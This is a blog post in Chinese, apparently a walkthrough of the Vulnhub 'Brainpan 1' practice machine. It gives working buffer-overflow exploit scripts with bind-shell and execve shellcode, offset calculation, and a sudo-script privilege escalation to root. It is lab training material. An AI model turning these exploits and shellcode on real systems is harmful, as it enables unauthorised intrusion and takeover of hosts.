@@ -1,0 +1,574 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Brainpan 1 - My Octopress Blog</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="周末Brainpan 1一日遊，依舊是Vulnhub的Vulnerable Machine，作者是superkojiman # Nmap 6.46 scan initiated Thu Jan 1 13:22:09 2015 as: nmap -sV -p- -Pn -o nmap.out 192 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2015/03/07/brainpan/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>身為一名程式設計師，研究資安也是很合理的事情</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Brainpan 1</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-03-07T00:54:43+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:54 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>周末<a href="https://www.vulnhub.com/entry/brainpan-1,51/">Brainpan 1</a>一日遊，依舊是<a href="https://www.vulnhub.com/">Vulnhub</a>的Vulnerable Machine，作者是<a href="https://www.vulnhub.com/author/superkojiman,43/">superkojiman</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<pre><code># Nmap 6.46 scan initiated Thu Jan  1 13:22:09 2015 as: nmap -sV -p- -Pn -o nmap.out 192.168.2.155
+Nmap scan report for 192.168.2.155
+Host is up (0.00020s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port9999-TCP:V=6.46%I=7%D=1/1%Time=54A5905C%P=x86_64-unknown-linux-gnu%
+SF:r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
+SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
+SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
+SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
+SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
+SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
+SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
+SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
+SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
+SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
+SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
+SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINP
+SF:AN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENT
+SF:ER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");
+MAC Address: 00:0C:29:03:CB:6C (VMware)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+# Nmap done at Thu Jan  1 13:22:50 2015 -- 1 IP address (1 host up) scanned in 40.75 seconds
+</code></pre>
+
+<p>掃出9999和10000上有東西，先連上9999試試看</p>
+
+<pre><code>_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD
+
+                          &gt;&gt;
+                          ACCESS DENIED
+</code></pre>
+
+<p>是個毫無頭緒的密碼輸入欄位，隨便試了幾個方法都沒有過，先擱置</p>
+
+<p>而在 <a href="http://192.168.2.155:10000">http://192.168.2.155:10000</a> 上面只出現一張圖片，沒有其他線索</p>
+
+<p>用dirbuster掃一下會找到在/bin目錄下有一個brainpan.exe，猜測應該是架在9999上的程式，直接抓下來看</p>
+
+<pre><code>root@kali:~/_Sec/vulnhub/brainpan# strings brainpan.exe
+[get_reply] s = [%s]
+[get_reply] copied %d bytes to buffer
+shitstorm
+</code></pre>
+
+<p>&ldquo;shitstorm&#8221;，這看起來超可疑的，直接連到目標機器試試看</p>
+
+<pre><code>_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+[________________________ WELCOME TO BRAINPAN _________________________]
+                          ENTER THE PASSWORD
+
+                          &gt;&gt; shitstorm
+                          ACCESS GRANTED
+</code></pre>
+
+<p>&ldquo;ACCSESS GRANTED&rdquo;!! 成功了!</p>
+
+<p>&hellip;然後甚麼事都沒發生，再用nmap掃一次，也沒有打開新的port，看來不是這麼簡單就能突破的關卡。</p>
+
+<p>再來用ImmunityDebugger載入brainpan.exe之後，找到shitstorm的位置</p>
+
+<p><img class="center" src="/images/2015-03-07-brainpan/shitstorm.png"></p>
+
+<p>這個函式看起來有buffer overflow的問題，而且不知道為甚麼，上面還有一個很神奇的函式，裡面直接提供了 JMP ESP</p>
+
+<p><img class="center" src="/images/2015-03-07-brainpan/welcome.png"></p>
+
+<p>接著來試看看能不能將return address改到311712F3。在ImmunityDebugger下個斷點後，執行下面這句</p>
+
+<pre><code>python -c 'print "A"*524 + "\xf3\x12\x17\x31"' | nc -v 192.168.2.152 9999
+</code></pre>
+
+<p><img class="center" src="/images/2015-03-07-brainpan/EIP.png"></p>
+
+<p>成功進來了，剩下的就是把shellcode塞到0x311712f3之後去執行</p>
+
+<p>找個<a href="http://shell-storm.org/shellcode/files/shellcode-882.php">bind shell</a> 把exploit拼起來</p>
+
+<pre><code>#!/usr/bin/python
+
+trash="A"*524
+
+ret_addr="\xf3\x12\x17\x31"
+
+shellcode=(
+"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
+)
+
+print trash+ret_addr+shellcode
+</code></pre>
+
+<p>送出之後會發現伺服器沒有回應，接著來連看看被綁定的1337 port</p>
+
+<pre><code>root@kali:~# nc -v 192.168.2.155 1337
+192.168.2.155: inverse host lookup failed: Unknown server error : Connection timed out
+(UNKNOWN) [192.168.2.155] 1337 (?) open
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+</code></pre>
+
+<p>成功拿到shell了，先來看看有沒有sudo權限</p>
+
+<pre><code>puck@brainpan:/home/puck$ sudo -l
+sudo -l
+Matching Defaults entries for puck on this host:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+</code></pre>
+
+<p>看來puck可以執行在anansi目錄下的一個anansi_util</p>
+
+<pre><code>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
+sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+- network
+- proclist
+- manual [command]
+</code></pre>
+
+<p>玩弄anansi_util發現試不出甚麼名堂，來找找anansi有沒有其他程式</p>
+
+<pre><code>puck@brainpan:/home/puck$ find / -user anansi 2&gt;/dev/null
+find / -user anansi 2&gt;/dev/null
+/usr/local/bin/validate
+/home/anansi
+
+puck@brainpan:/home/puck/web$ ls -al /usr/local/bin/validate
+ls -al /usr/local/bin/validate
+-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate
+
+puck@brainpan:/home/puck$ /usr/local/bin/validate
+/usr/local/bin/validate
+usage /usr/local/bin/validate &lt;input&gt;
+
+puck@brainpan:/home/puck$ /usr/local/bin/validate 123
+/usr/local/bin/validate 123
+validating input...passed.
+</code></pre>
+
+<p>/usr/local/bin/validate 是個設有sticky bit的程式，不過執行之後試不出東西，在brainpan上面gdb也不能用，只好把它複製到/home/puck/web再回Kali Linux用gdb看</p>
+
+<pre><code>root@kali:~/_Sec/vulnhub/brainpan# gdb -q validate
+Reading symbols from /root/_Sec/vulnhub/brainpan/validate...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : Partial
+</code></pre>
+
+<p>看起來沒有甚麼安全性的設定，看一下有哪些函式可以用</p>
+
+<pre><code>gdb-peda$ info functions
+All defined functions:
+
+File validate.c:
+int main(int, char **);
+char *validate(char *);
+
+Non-debugging symbols:
+0x0804834c  _init
+0x0804838c  __gmon_start__
+0x0804838c  __gmon_start__@plt
+0x0804839c  __libc_start_main
+0x0804839c  __libc_start_main@plt
+0x080483ac  strlen
+0x080483ac  strlen@plt
+0x080483bc  strcpy
+0x080483bc  strcpy@plt
+0x080483cc  printf
+0x080483cc  printf@plt
+0x080483dc  puts
+0x080483dc  puts@plt
+0x080483ec  exit
+0x080483ec  exit@plt
+0x08048400  _start
+0x08048430  __do_global_dtors_aux
+0x08048490  frame_dummy
+0x080485a0  __libc_csu_fini
+0x080485b0  __libc_csu_init
+0x0804860a  __i686.get_pc_thunk.bx
+0x08048610  __do_global_ctors_aux
+0x0804863c  _fini
+</code></pre>
+
+<p>validate看起來應該是驗證輸入用的，接著看一下反組譯的結果</p>
+
+<pre><code>gdb-peda$ disas validate
+Dump of assembler code for function validate:
+   0x080484b4 &lt;+0&gt;:     push   ebp
+   0x080484b5 &lt;+1&gt;:     mov    ebp,esp
+   0x080484b7 &lt;+3&gt;:     push   ebx
+   0x080484b8 &lt;+4&gt;:     sub    esp,0x84
+   0x080484be &lt;+10&gt;:    mov    DWORD PTR [ebp-0xc],0x0
+   0x080484c5 &lt;+17&gt;:    mov    DWORD PTR [ebp-0xc],0x0
+   0x080484cc &lt;+24&gt;:    jmp    0x8048508 &lt;validate+84&gt;
+   0x080484ce &lt;+26&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080484d1 &lt;+29&gt;:    add    eax,DWORD PTR [ebp+0x8]
+   0x080484d4 &lt;+32&gt;:    movzx  eax,BYTE PTR [eax]
+   0x080484d7 &lt;+35&gt;:    cmp    al,0x46
+   0x080484d9 &lt;+37&gt;:    jne    0x8048504 &lt;validate+80&gt;
+   0x080484db &lt;+39&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x080484de &lt;+42&gt;:    add    eax,DWORD PTR [ebp+0x8]
+   0x080484e1 &lt;+45&gt;:    movzx  eax,BYTE PTR [eax]
+   0x080484e4 &lt;+48&gt;:    movsx  edx,al
+   0x080484e7 &lt;+51&gt;:    mov    eax,0x8048660
+   0x080484ec &lt;+56&gt;:    mov    DWORD PTR [esp+0x4],edx
+   0x080484f0 &lt;+60&gt;:    mov    DWORD PTR [esp],eax
+   0x080484f3 &lt;+63&gt;:    call   0x80483cc &lt;printf@plt&gt;
+   0x080484f8 &lt;+68&gt;:    mov    DWORD PTR [esp],0x1
+   0x080484ff &lt;+75&gt;:    call   0x80483ec &lt;exit@plt&gt;
+   0x08048504 &lt;+80&gt;:    add    DWORD PTR [ebp-0xc],0x1
+   0x08048508 &lt;+84&gt;:    mov    ebx,DWORD PTR [ebp-0xc]
+   0x0804850b &lt;+87&gt;:    mov    eax,DWORD PTR [ebp+0x8]
+   0x0804850e &lt;+90&gt;:    mov    DWORD PTR [esp],eax
+   0x08048511 &lt;+93&gt;:    call   0x80483ac &lt;strlen@plt&gt;
+   0x08048516 &lt;+98&gt;:    cmp    ebx,eax
+   0x08048518 &lt;+100&gt;:   jb     0x80484ce &lt;validate+26&gt;
+   0x0804851a &lt;+102&gt;:   mov    eax,DWORD PTR [ebp+0x8]
+   0x0804851d &lt;+105&gt;:   mov    DWORD PTR [esp+0x4],eax
+   0x08048521 &lt;+109&gt;:   lea    eax,[ebp-0x70]
+   0x08048524 &lt;+112&gt;:   mov    DWORD PTR [esp],eax
+   0x08048527 &lt;+115&gt;:   call   0x80483bc &lt;strcpy@plt&gt;
+   0x0804852c &lt;+120&gt;:   lea    eax,[ebp-0x70]
+   0x0804852f &lt;+123&gt;:   add    esp,0x84
+   0x08048535 &lt;+129&gt;:   pop    ebx
+   0x08048536 &lt;+130&gt;:   pop    ebp
+   0x08048537 &lt;+131&gt;:   ret
+End of assembler dump.
+</code></pre>
+
+<p>validate就只是驗證輸入的字串的裡面有沒有出現&#8221;F&#8221;(0x46)，有出現&#8221;F&#8221;就是驗證失敗</p>
+
+<p>這個程式就這麼簡單，不過因為它有設定sticky bits，接下來試試看有沒有buffer overflow可以利用來取得anansi的shell</p>
+
+<pre><code>gdb-peda$ r `python -c 'print "A"*200'`
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xffffcab8 ('A' &lt;repeats 200 times&gt;...)
+EBX: 0x41414141 ('AAAA')
+ECX: 0x0
+EDX: 0xbb9
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffcb30 ('A' &lt;repeats 200 times&gt;...)
+EIP: 0x41414141 ('AAAA')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+</code></pre>
+
+<p>eip被塞滿了A，接下來看看有沒有JMP ESP可以利用</p>
+
+<pre><code>root@kali:~/_Sec/vulnhub/brainpan# msfelfscan -j esp validate
+[validate]
+</code></pre>
+
+<p>空無一物，不過看到EAX也被輸入的A給塞滿了，再來找一下有沒有JMP EAX可以用</p>
+
+<pre><code>root@kali:~/_Sec/vulnhub/brainpan# msfelfscan -j eax validate
+[validate]
+0x080484af call eax
+0x0804862b call eax
+</code></pre>
+
+<p>有兩個可以用，接著只要找到return adrdress之後跟shellcode當作參數傳入後應該就能拿到shell了</p>
+
+<pre><code>root@kali:~/_Sec/vulnhub/brainpan# /usr/share/metasploit-framework/tools/pattern_create.rb 1000
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+root@kali:~/_Sec/vulnhub/brainpan# gdb -q ./validate
+Reading symbols from /root/_Sec/vulnhub/brainpan/validate...done.
+gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
+
+Program received signal SIGSEGV, Segmentation fault.
+.....
+0x39644138 in ?? ()
+gdb-peda$ q
+root@kali:~/_Sec/vulnhub/brainpan# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x39644138
+[*] Exact match at offset 116
+</code></pre>
+
+<p>算出來return address的位置在116，接下來要找一個字串長度在116個字以內的<a href="http://shell-storm.org/shellcode/files/shellcode-606.php">shellcode</a>串成要用的exploit</p>
+
+<pre><code>root@kali:~/_Sec/vulnhub/brainpan# cat shell_exp.py
+#!/usr/bin/python
+
+shellcode=(
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
+"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
+"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
+"\x51\x53\x89\xe1\xcd\x80"
+)
+
+nop="\x90"*(116-len(shellcode))
+
+ret_addr="\xaf\x94\x04\x08"
+
+print shellcode+nop+ret_addr
+
+root@kali:~/_Sec/vulnhub/brainpan# ./validate `python shell_exp.py`
+root@kali:/root/_Sec/vulnhub/brainpan#
+</code></pre>
+
+<p>成功執行了/bin/sh，接下來實際到brainpan上面試試</p>
+
+<pre><code>puck@brainpan:/home/puck$ /usr/local/bin/validate  `python shell_exp.py`
+/usr/local/bin/validate  `python shell_exp.py`
+bash-4.2$ id
+id
+uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
+</code></pre>
+
+<p>拿到了anansi的權限，我們就可以去修改anansi_util，讓它變成一支可以產生shell的程式，最後再回到puck用sudo(root權限)執行</p>
+
+<pre><code>bash-4.2$ cat anansi_util
+cat anansi_util
+i#!/usr/bin/python
+
+import pty
+pty.spawn("/bin/bash")
+bash-4.2$ chmod +x anansi_util
+chmod +x anansi_util
+bash-4.2$ exit
+exit
+exit
+puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
+sudo /home/anansi/bin/anansi_util
+root@brainpan:/home/puck# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+<p>打完收工 :)</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-03-07T00:54:43+08:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>12:54 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2015/03/07/brainpan/" data-via="" data-counturl="http://newdominic.github.io/blog/2015/03/07/brainpan/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/03/02/Sokar/" title="Previous Post: Sokar">&laquo; Sokar</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/03/07/brainpan/">Brainpan 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/03/02/Sokar/">Sokar</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
